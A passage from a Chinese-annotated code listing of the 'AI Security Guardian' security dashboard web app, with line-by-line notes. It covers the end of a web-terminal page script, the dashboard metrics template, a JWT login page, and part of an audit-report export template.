| 78 | 文本内容：作为页面可见文案或模板数据。 | `        });` |
| 79 | 文本内容：作为页面可见文案或模板数据。 | `        no.addEventListener("click", () => wrap.remove());` |
| 80 | 文本内容：作为页面可见文案或模板数据。 | `        term.insertBefore(wrap, prompt);` |
| 81 | 文本内容：作为页面可见文案或模板数据。 | `        term.scrollTop = term.scrollHeight;` |
| 82 | 文本内容：作为页面可见文案或模板数据。 | `      }` |
| 83 | 空行：分隔模板结构。 | `&nbsp;` |
| 84 | 文本内容：作为页面可见文案或模板数据。 | `      input.addEventListener("keydown", (e) => {` |
| 85 | 文本内容：作为页面可见文案或模板数据。 | `        if (e.key === "Enter") {` |
| 86 | 文本内容：作为页面可见文案或模板数据。 | `          const cmd = input.value.trim();` |
| 87 | 文本内容：作为页面可见文案或模板数据。 | `          if (!cmd) return;` |
| 88 | 文本内容：作为页面可见文案或模板数据。 | `          history.push(cmd);` |
| 89 | 文本内容：作为页面可见文案或模板数据。 | `          historyIdx = history.length;` |
| 90 | 文本内容：作为页面可见文案或模板数据。 | `          input.value = "";` |
| 91 | 文本内容：作为页面可见文案或模板数据。 | `          if (DANGEROUS.test(cmd)) {` |
| 92 | 文本内容：作为页面可见文案或模板数据。 | `            confirmInline(cmd, () => runCommand(cmd));` |
| 93 | 文本内容：作为页面可见文案或模板数据。 | `          } else {` |
| 94 | 文本内容：作为页面可见文案或模板数据。 | `            runCommand(cmd);` |
| 95 | 文本内容：作为页面可见文案或模板数据。 | `          }` |
| 96 | 文本内容：作为页面可见文案或模板数据。 | `        } else if (e.key === "ArrowUp") {` |
| 97 | 文本内容：作为页面可见文案或模板数据。 | `          if (historyIdx > 0) {` |
| 98 | 文本内容：作为页面可见文案或模板数据。 | `            historyIdx -= 1;` |
| 99 | 文本内容：作为页面可见文案或模板数据。 | `            input.value = history[historyIdx] \|\| "";` |
| 100 | 文本内容：作为页面可见文案或模板数据。 | `          }` |
| 101 | 文本内容：作为页面可见文案或模板数据。 | `          e.preventDefault();` |
| 102 | 文本内容：作为页面可见文案或模板数据。 | `        } else if (e.key === "ArrowDown") {` |
| 103 | 文本内容：作为页面可见文案或模板数据。 | `          if (historyIdx < history.length - 1) {` |
| 104 | 文本内容：作为页面可见文案或模板数据。 | `            historyIdx += 1;` |
| 105 | 文本内容：作为页面可见文案或模板数据。 | `            input.value = history[historyIdx] \|\| "";` |
| 106 | 文本内容：作为页面可见文案或模板数据。 | `          } else {` |
| 107 | 文本内容：作为页面可见文案或模板数据。 | `            historyIdx = history.length;` |
| 108 | 文本内容：作为页面可见文案或模板数据。 | `            input.value = "";` |
| 109 | 文本内容：作为页面可见文案或模板数据。 | `          }` |
| 110 | 文本内容：作为页面可见文案或模板数据。 | `          e.preventDefault();` |
| 111 | 文本内容：作为页面可见文案或模板数据。 | `        }` |
| 112 | 文本内容：作为页面可见文案或模板数据。 | `      });` |
| 113 | 空行：分隔模板结构。 | `&nbsp;` |
| 114 | 文本内容：作为页面可见文案或模板数据。 | `      input.focus();` |
| 115 | 文本内容：作为页面可见文案或模板数据。 | `    })();` |
| 116 | 标签闭合：结束当前 HTML 元素。 | `  </script>` |
| 117 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/dashboard.html`

- 类型：前端页面模板
- 行数：103

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}安全态势感知 · AI Security Guardian{% endblock %}` |
| 4 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}安全态势感知{% endblock %}` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 7 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-refresh" type="button">刷新</button>` |
| 8 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 9 | 空行：分隔模板结构。 | `&nbsp;` |
| 10 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 11 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 顶部 4 指标卡（DESIGN.md §8.1） -#}` |
| 12 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="metrics-grid" aria-label="关键指标">` |
| 13 | HTML 结构：定义 `article` 元素及其属性或内容。 | `    <article class="metric-card">` |
| 14 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__label">实时流量（包/秒）</span>` |
| 15 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__value" data-metric="total_packets">--</span>` |
| 16 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__trend" data-trend="total_packets"></span>` |
| 17 | 标签闭合：结束当前 HTML 元素。 | `    </article>` |
| 18 | HTML 结构：定义 `article` 元素及其属性或内容。 | `    <article class="metric-card">` |
| 19 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__label">威胁总数</span>` |
| 20 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__value metric-card__value--danger" data-metric="total_threats">--</span>` |
| 21 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__trend" data-trend="total_threats"></span>` |
| 22 | 标签闭合：结束当前 HTML 元素。 | `    </article>` |
| 23 | HTML 结构：定义 `article` 元素及其属性或内容。 | `    <article class="metric-card">` |
| 24 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__label">安全评分</span>` |
| 25 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__value metric-card__value--emerald" data-metric="security_score">--</span>` |
| 26 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__trend" data-trend="security_score"></span>` |
| 27 | 标签闭合：结束当前 HTML 元素。 | `    </article>` |
| 28 | HTML 结构：定义 `article` 元素及其属性或内容。 | `    <article class="metric-card">` |
| 29 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__label">封禁 IP 数</span>` |
| 30 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__value metric-card__value--warning" data-metric="banned_ips">--</span>` |
| 31 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="metric-card__trend" data-trend="banned_ips"></span>` |
| 32 | 标签闭合：结束当前 HTML 元素。 | `    </article>` |
| 33 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 34 | 空行：分隔模板结构。 | `&nbsp;` |
| 35 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 中部：流量趋势 + 攻击类型分布 -#}` |
| 36 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="grid-2" aria-label="流量与攻击分布" style="margin-bottom: var(--space-lg)">` |
| 37 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card">` |
| 38 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__header">` |
| 39 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="card__title">流量趋势</h3>` |
| 40 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="topbar__actions" style="gap: var(--space-xs)">` |
| 41 | 按钮控件：提供可点击操作入口。 | `          <button class="btn btn--ghost btn--sm is-active" data-range="24h" type="button">24H</button>` |
| 42 | 按钮控件：提供可点击操作入口。 | `          <button class="btn btn--ghost btn--sm" data-range="7d" type="button">7D</button>` |
| 43 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 44 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 45 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__body">` |
| 46 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div id="chart-traffic" class="chart"></div>` |
| 47 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 48 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 49 | 空行：分隔模板结构。 | `&nbsp;` |
| 50 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card">` |
| 51 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__header">` |
| 52 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="card__title">攻击类型分布</h3>` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 54 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__body">` |
| 55 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div id="chart-attack-types" class="chart"></div>` |
| 56 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 57 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 58 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 59 | 空行：分隔模板结构。 | `&nbsp;` |
| 60 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 下部：Top10 攻击来源 + 实时告警 -#}` |
| 61 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="grid-2" aria-label="攻击来源与告警" style="margin-bottom: var(--space-lg)">` |
| 62 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card">` |
| 63 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__header">` |
| 64 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="card__title">攻击来源 Top10</h3>` |
| 65 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 66 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__body">` |
| 67 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div id="chart-top-attackers" class="chart"></div>` |
| 68 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 69 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 70 | 空行：分隔模板结构。 | `&nbsp;` |
| 71 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card">` |
| 72 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__header">` |
| 73 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="card__title">实时告警</h3>` |
| 74 | HTML 结构：定义 `a` 元素及其属性或内容。 | `        <a class="btn btn--ghost btn--sm" href="/alerts">查看全部</a>` |
| 75 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 76 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__body">` |
| 77 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `        <ul class="alert-list" id="alert-list">` |
| 78 | HTML 结构：定义 `li` 元素及其属性或内容。 | `          <li class="alert-list__empty">等待告警数据…</li>` |
| 79 | 标签闭合：结束当前 HTML 元素。 | `        </ul>` |
| 80 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 81 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 82 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 83 | 空行：分隔模板结构。 | `&nbsp;` |
| 84 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 底部：安全事件时间线 -#}` |
| 85 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section aria-label="安全事件时间线">` |
| 86 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card">` |
| 87 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__header">` |
| 88 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="card__title">安全事件时间线</h3>` |
| 89 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 90 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="card__body">` |
| 91 | HTML 结构：定义 `ol` 元素及其属性或内容。 | `        <ol class="timeline" id="event-timeline">` |
| 92 | HTML 结构：定义 `li` 元素及其属性或内容。 | `          <li class="alert-list__empty">暂无事件</li>` |
| 93 | 标签闭合：结束当前 HTML 元素。 | `        </ol>` |
| 94 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 95 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 96 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 97 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 98 | 空行：分隔模板结构。 | `&nbsp;` |
| 99 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 100 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="https://cdn.jsdelivr.net/npm/echarts@5.4.3/dist/echarts.min.js"></script>` |
| 101 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>` |
| 102 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>` |
| 103 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/login.html`

- 类型：前端页面模板
- 行数：136

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 2 | 文本内容：作为页面可见文案或模板数据。 | `  login.html — Phase 7 独立登录页` |
| 3 | 空行：分隔模板结构。 | `&nbsp;` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  设计规范：` |
| 5 | 文本内容：作为页面可见文案或模板数据。 | `    - 不 extends base.html，单独布局（DESIGN.md 无侧边栏）` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `    - 深色 SOC 主题 + 翠绿强调` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 通过 \`/api/auth/login\` 获取 JWT，存 localStorage 后跳 \`/dashboard\`` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 9 | HTML 结构：定义页面元素。 | `<!DOCTYPE html>` |
| 10 | HTML 结构：定义 `html` 元素及其属性或内容。 | `<html lang="zh-CN">` |
| 11 | HTML 结构：定义 `head` 元素及其属性或内容。 | `  <head>` |
| 12 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta charset="UTF-8" />` |
| 13 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta name="viewport" content="width=device-width, initial-scale=1.0" />` |
| 14 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta name="color-scheme" content="dark" />` |
| 15 | HTML 结构：定义 `title` 元素及其属性或内容。 | `    <title>登录 · AI Security Guardian</title>` |
| 16 | 资源引用：加载页面样式或外部资源。 | `    <link` |
| 17 | 文本内容：作为页面可见文案或模板数据。 | `      rel="preconnect"` |
| 18 | 文本内容：作为页面可见文案或模板数据。 | `      href="https://fonts.googleapis.com"` |
| 19 | 文本内容：作为页面可见文案或模板数据。 | `      crossorigin` |
| 20 | 文本内容：作为页面可见文案或模板数据。 | `    />` |
| 21 | 资源引用：加载页面样式或外部资源。 | `    <link` |
| 22 | 文本内容：作为页面可见文案或模板数据。 | `      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"` |
| 23 | 文本内容：作为页面可见文案或模板数据。 | `      rel="stylesheet"` |
| 24 | 文本内容：作为页面可见文案或模板数据。 | `    />` |
| 25 | 资源引用：加载页面样式或外部资源。 | `    <link rel="stylesheet" href="{{ url_for('static', filename='css/theme.css') }}" />` |
| 26 | 资源引用：加载页面样式或外部资源。 | `    <link rel="stylesheet" href="{{ url_for('static', filename='css/components.css') }}" />` |
| 27 | 标签闭合：结束当前 HTML 元素。 | `  </head>` |
| 28 | HTML 结构：定义 `body` 元素及其属性或内容。 | `  <body data-page="login">` |
| 29 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="login-shell">` |
| 30 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="login-card" role="form" aria-labelledby="login-title">` |
| 31 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="login-card__brand">` |
| 32 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span class="sidebar__brand-dot" aria-hidden="true"></span>` |
| 33 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span id="login-title">AI Security Guardian</span>` |
| 34 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 35 | HTML 结构：定义 `p` 元素及其属性或内容。 | `        <p class="login-card__subtitle">` |
| 36 | 文本内容：作为页面可见文案或模板数据。 | `          登录以访问安全态势感知控制台。` |
| 37 | 标签闭合：结束当前 HTML 元素。 | `        </p>` |
| 38 | 空行：分隔模板结构。 | `&nbsp;` |
| 39 | 表单结构：承载用户输入和提交动作。 | `        <form id="login-form" novalidate>` |
| 40 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 41 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="login-username">用户名</label>` |
| 42 | 输入控件：收集用户填写或选择的数据。 | `            <input` |
| 43 | 文本内容：作为页面可见文案或模板数据。 | `              class="form-input"` |
| 44 | 文本内容：作为页面可见文案或模板数据。 | `              id="login-username"` |
| 45 | 文本内容：作为页面可见文案或模板数据。 | `              name="username"` |
| 46 | 文本内容：作为页面可见文案或模板数据。 | `              autocomplete="username"` |
| 47 | 文本内容：作为页面可见文案或模板数据。 | `              required` |
| 48 | 文本内容：作为页面可见文案或模板数据。 | `              maxlength="64"` |
| 49 | 文本内容：作为页面可见文案或模板数据。 | `            />` |
| 50 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 51 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-group">` |
| 52 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="form-label" for="login-password">密码</label>` |
| 53 | 输入控件：收集用户填写或选择的数据。 | `            <input` |
| 54 | 文本内容：作为页面可见文案或模板数据。 | `              class="form-input"` |
| 55 | 文本内容：作为页面可见文案或模板数据。 | `              id="login-password"` |
| 56 | 文本内容：作为页面可见文案或模板数据。 | `              name="password"` |
| 57 | 文本内容：作为页面可见文案或模板数据。 | `              type="password"` |
| 58 | 文本内容：作为页面可见文案或模板数据。 | `              autocomplete="current-password"` |
| 59 | 文本内容：作为页面可见文案或模板数据。 | `              required` |
| 60 | 文本内容：作为页面可见文案或模板数据。 | `              maxlength="128"` |
| 61 | 文本内容：作为页面可见文案或模板数据。 | `            />` |
| 62 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 63 | 按钮控件：提供可点击操作入口。 | `          <button class="btn btn--primary btn--block" type="submit" id="login-submit">` |
| 64 | 文本内容：作为页面可见文案或模板数据。 | `            登录` |
| 65 | 标签闭合：结束当前 HTML 元素。 | `          </button>` |
| 66 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-error" id="login-error" role="alert"></div>` |
| 67 | 标签闭合：结束当前 HTML 元素。 | `        </form>` |
| 68 | 空行：分隔模板结构。 | `&nbsp;` |
| 69 | HTML 结构：定义 `p` 元素及其属性或内容。 | `        <p class="caption" style="margin-top: var(--space-md); text-align: center">` |
| 70 | 文本内容：作为页面可见文案或模板数据。 | `          首次登录请参考` |
| 71 | HTML 结构：定义 `code` 元素及其属性或内容。 | `          <code class="mono">.env.example</code> 中的` |
| 72 | HTML 结构：定义 `code` 元素及其属性或内容。 | `          <code class="mono">ADMIN_USERNAME</code> /` |
| 73 | HTML 结构：定义 `code` 元素及其属性或内容。 | `          <code class="mono">ADMIN_PASSWORD</code>` |
| 74 | 标签闭合：结束当前 HTML 元素。 | `        </p>` |
| 75 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 76 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 77 | 空行：分隔模板结构。 | `&nbsp;` |
| 78 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div id="ag-toast-container" class="toast-container" aria-live="polite"></div>` |
| 79 | 空行：分隔模板结构。 | `&nbsp;` |
| 80 | 脚本引用：加载页面所需 JavaScript。 | `    <script src="{{ url_for('static', filename='js/utils.js') }}"></script>` |
| 81 | 脚本引用：加载页面所需 JavaScript。 | `    <script>` |
| 82 | 文本内容：作为页面可见文案或模板数据。 | `      (function () {` |
| 83 | 文本内容：作为页面可见文案或模板数据。 | `        "use strict";` |
| 84 | 空行：分隔模板结构。 | `&nbsp;` |
| 85 | 文本内容：作为页面可见文案或模板数据。 | `        const form = document.getElementById("login-form");` |
| 86 | 文本内容：作为页面可见文案或模板数据。 | `        const errorNode = document.getElementById("login-error");` |
| 87 | 文本内容：作为页面可见文案或模板数据。 | `        const submitBtn = document.getElementById("login-submit");` |
| 88 | 文本内容：作为页面可见文案或模板数据。 | `        const userInput = document.getElementById("login-username");` |
| 89 | 文本内容：作为页面可见文案或模板数据。 | `        const passInput = document.getElementById("login-password");` |
| 90 | 空行：分隔模板结构。 | `&nbsp;` |
| 91 | 文本内容：作为页面可见文案或模板数据。 | `        // 如果已经有有效 token，直接跳仪表盘` |
| 92 | 文本内容：作为页面可见文案或模板数据。 | `        if (window.AGApi.getToken()) {` |
| 93 | 文本内容：作为页面可见文案或模板数据。 | `          location.href = "/dashboard";` |
| 94 | 文本内容：作为页面可见文案或模板数据。 | `        }` |
| 95 | 空行：分隔模板结构。 | `&nbsp;` |
| 96 | 文本内容：作为页面可见文案或模板数据。 | `        // 消费从其他页面带过来的跳转提示` |
| 97 | 文本内容：作为页面可见文案或模板数据。 | `        const msg = sessionStorage.getItem("ag_login_message");` |
| 98 | 文本内容：作为页面可见文案或模板数据。 | `        if (msg) {` |
| 99 | 文本内容：作为页面可见文案或模板数据。 | `          errorNode.textContent = msg;` |
| 100 | 文本内容：作为页面可见文案或模板数据。 | `          sessionStorage.removeItem("ag_login_message");` |
| 101 | 文本内容：作为页面可见文案或模板数据。 | `        }` |
| 102 | 空行：分隔模板结构。 | `&nbsp;` |
| 103 | 文本内容：作为页面可见文案或模板数据。 | `        form.addEventListener("submit", async (e) => {` |
| 104 | 文本内容：作为页面可见文案或模板数据。 | `          e.preventDefault();` |
| 105 | 文本内容：作为页面可见文案或模板数据。 | `          errorNode.textContent = "";` |
| 106 | 空行：分隔模板结构。 | `&nbsp;` |
| 107 | 文本内容：作为页面可见文案或模板数据。 | `          const username = userInput.value.trim();` |
| 108 | 文本内容：作为页面可见文案或模板数据。 | `          const password = passInput.value;` |
| 109 | 空行：分隔模板结构。 | `&nbsp;` |
| 110 | 文本内容：作为页面可见文案或模板数据。 | `          if (!username \|\| !password) {` |
| 111 | 文本内容：作为页面可见文案或模板数据。 | `            errorNode.textContent = "请填写用户名与密码";` |
| 112 | 文本内容：作为页面可见文案或模板数据。 | `            return;` |
| 113 | 文本内容：作为页面可见文案或模板数据。 | `          }` |
| 114 | 空行：分隔模板结构。 | `&nbsp;` |
| 115 | 文本内容：作为页面可见文案或模板数据。 | `          submitBtn.disabled = true;` |
| 116 | 文本内容：作为页面可见文案或模板数据。 | `          submitBtn.textContent = "登录中…";` |
| 117 | 空行：分隔模板结构。 | `&nbsp;` |
| 118 | 文本内容：作为页面可见文案或模板数据。 | `          try {` |
| 119 | 文本内容：作为页面可见文案或模板数据。 | `            const data = await window.AGApi.fetchApi("/api/auth/login", {` |
| 120 | 文本内容：作为页面可见文案或模板数据。 | `              method: "POST",` |
| 121 | 文本内容：作为页面可见文案或模板数据。 | `              body: { username, password },` |
| 122 | 文本内容：作为页面可见文案或模板数据。 | `              skipAuth: true,` |
| 123 | 文本内容：作为页面可见文案或模板数据。 | `            });` |
| 124 | 文本内容：作为页面可见文案或模板数据。 | `            window.AGApi.setTokens(data);` |
| 125 | 文本内容：作为页面可见文案或模板数据。 | `            location.href = "/dashboard";` |
| 126 | 文本内容：作为页面可见文案或模板数据。 | `          } catch (err) {` |
| 127 | 文本内容：作为页面可见文案或模板数据。 | `            errorNode.textContent = err.message \|\| "登录失败";` |
| 128 | 文本内容：作为页面可见文案或模板数据。 | `          } finally {` |
| 129 | 文本内容：作为页面可见文案或模板数据。 | `            submitBtn.disabled = false;` |
| 130 | 文本内容：作为页面可见文案或模板数据。 | `            submitBtn.textContent = "登录";` |
| 131 | 文本内容：作为页面可见文案或模板数据。 | `          }` |
| 132 | 文本内容：作为页面可见文案或模板数据。 | `        });` |
| 133 | 文本内容：作为页面可见文案或模板数据。 | `      })();` |
| 134 | 标签闭合：结束当前 HTML 元素。 | `    </script>` |
| 135 | 标签闭合：结束当前 HTML 元素。 | `  </body>` |
| 136 | 标签闭合：结束当前 HTML 元素。 | `</html>` |

## `web/templates/report_export.html`

- 类型：前端页面模板
- 行数：93

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | HTML 结构：定义页面元素。 | `<!DOCTYPE html>` |
| 2 | HTML 注释：解释模板片段用途。 | `<!-- guardian-report-export -->` |
| 3 | HTML 结构：定义 `html` 元素及其属性或内容。 | `<html lang="zh-CN">` |
| 4 | HTML 结构：定义 `head` 元素及其属性或内容。 | `<head>` |
| 5 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `  <meta charset="utf-8" />` |
| 6 | HTML 结构：定义 `title` 元素及其属性或内容。 | `  <title>AI 安全守卫 — 审计报告</title>` |
| 7 | HTML 结构：定义 `style` 元素及其属性或内容。 | `  <style>` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    body { font-family: system-ui, sans-serif; margin: 2rem; color: #111; }` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    h1 { font-size: 1.5rem; }` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `    h2 { font-size: 1.1rem; margin-top: 1.5rem; border-bottom: 1px solid #ddd; padding-bottom: 0.25rem; }` |
| 11 | 文本内容：作为页面可见文案或模板数据。 | `    table { border-collapse: collapse; width: 100%; margin: 0.5rem 0; font-size: 0.9rem; }` |
| 12 | 文本内容：作为页面可见文案或模板数据。 | `    th, td { border: 1px solid #ccc; padding: 0.35rem 0.5rem; text-align: left; }` |
| 13 | 文本内容：作为页面可见文案或模板数据。 | `    .muted { color: #666; font-size: 0.85rem; }` |
| 14 | 文本内容：作为页面可见文案或模板数据。 | `    @media print { body { margin: 1rem; } }` |
| 15 | 标签闭合：结束当前 HTML 元素。 | `  </style>` |
| 16 | 标签闭合：结束当前 HTML 元素。 | `</head>` |
| 17 | HTML 结构：定义 `body` 元素及其属性或内容。 | `<body>` |
| 18 | HTML 结构：定义 `h1` 元素及其属性或内容。 | `  <h1>AI 安全守卫 · 审计报告</h1>` |
| 19 | HTML 结构：定义 `p` 元素及其属性或内容。 | `  <p class="muted">` |
| 20 | 文本内容：作为页面可见文案或模板数据。 | `    周期：{{ summary.period }} · 窗口 {{ summary.window.start }} — {{ summary.window.end }} ·` |
| 21 | 文本内容：作为页面可见文案或模板数据。 | `    生成时间 {{ summary.generated_at }}` |
| 22 | 标签闭合：结束当前 HTML 元素。 | `  </p>` |
| 23 | 空行：分隔模板结构。 | `&nbsp;` |
| 24 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>周期概览</h2>` |
| 25 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 26 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for k, v in summary.overview.items() %}` |
| 27 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>{{ k }}</th><td>{{ v }}</td></tr>` |
| 28 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 29 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 30 | 空行：分隔模板结构。 | `&nbsp;` |
| 31 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>告警等级分布</h2>` |
| 32 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 33 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>等级</th><th>数量</th></tr>` |
| 34 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for row in summary.threats.by_level %}` |
| 35 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><td>{{ row.level }}</td><td>{{ row.count }}</td></tr>` |
| 36 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 37 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 38 | 空行：分隔模板结构。 | `&nbsp;` |
| 39 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>告警类型（Top）</h2>` |
| 40 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 41 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>类型</th><th>数量</th></tr>` |
| 42 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for row in summary.threats.by_type %}` |
| 43 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><td>{{ row.type }}</td><td>{{ row.count }}</td></tr>` |
| 44 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 45 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 46 | 空行：分隔模板结构。 | `&nbsp;` |
| 47 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>攻击来源 Top10</h2>` |
| 48 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 49 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>IP</th><th>次数</th></tr>` |
| 50 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for row in summary.threats.top_sources %}` |
